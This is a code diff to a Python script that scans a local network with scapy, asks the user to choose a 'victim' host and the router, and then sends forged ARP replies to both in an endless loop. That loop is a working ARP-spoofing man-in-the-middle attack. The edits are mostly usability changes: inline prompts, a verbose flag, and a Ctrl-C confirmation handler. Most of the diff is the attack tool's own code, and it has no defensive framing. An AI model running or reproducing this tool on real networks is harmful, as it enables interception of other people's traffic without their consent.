@@ -5,6 +5,7 @@ import threading as th
 import time
 import platform
 import ipaddress
+import signal
 
 def checkSystem():
     os.system('clear')
@@ -24,9 +25,7 @@ def graphBar():
     print("")
 
 def login():
-    print("Enter network ip : (example : 192.168.1.0/24)", "\n")
-
-    target_ip = input()
+    target_ip = input("Enter network ip : (example : 192.168.1.0/24)\n")
     if not checkIP(target_ip):
         os.system('clear')
         graphBar()
@@ -73,8 +72,7 @@ def isGoodNetwork(target, ip, mac):
     if len(ip) <= 1:
         global victim
         global router
-        print("There's no one in this network, are you sure it is the one you meant to explore ? If you are, you can refresh with: 'refresh'.\nYou can quit with 'ctrl+c'.\nYou can also change your network target simply by typing 'change'")
-        userInput = input()
+        userInput = input("There's no one in this network, are you sure it is the one you meant to explore ? If you are, you can refresh with: 'refresh'.\nYou can quit with 'ctrl+c'.\nYou can also change your network target simply by typing 'change'")
         if userInput == "refresh":
             graphBar()
             print("Refreshing network", target)
@@ -90,10 +88,8 @@ def isGoodNetwork(target, ip, mac):
     else:
         print("ips in the network" , ip)
         print("macs in the network", mac,"\n")
-        print("Select your target ip. (1, 2, 3)...")
-        victim = input()
-        print("Select router ip. (1, 2, 3)... (Usually ends by .254)")
-        router = input()
+        victim = input("Select your target ip. (1, 2, 3)...\n")
+        router = input("Select router ip. (1, 2, 3)... (Usually ends by .254)\n")
         return victim, router
 
 def checkIP(ipCheck):
@@ -112,9 +108,24 @@ target = login()
 ip, mac = scan(target)
 victim, router = isGoodNetwork(target, ip, mac)
 
+verboseShow = input("Would you like to see verbose? (shows every packet send.) y/n\n")
+if verboseShow == "y":
+    verboseShow = True
+else:
+    verboseShow = False
+print("Start sending packets.")
+
+def handler(signum, frame):
+    res = input("Ctrl-c was pressed. Do you really want to exit? y/n\n")
+    if res == "y":
+        print("farewell")
+        exit(1)
+
+signal.signal(signal.SIGINT, handler)
+
 while True: 
     arp_response = ARP(pdst=ip[int(victim)-1], hwdst=mac[int(victim)-1], psrc=ip[int(router)-1])
-    scap.send(arp_response, count = 1)
+    scap.send(arp_response, count = 1, verbose=verboseShow)
     arp_response = ARP(pdst=ip[int(router)-1], hwdst=mac[int(router)-1], psrc=ip[int(victim)-1])
-    scap.send(arp_response, count = 1)
+    scap.send(arp_response, count = 1, verbose=verboseShow)
     time.sleep(1)
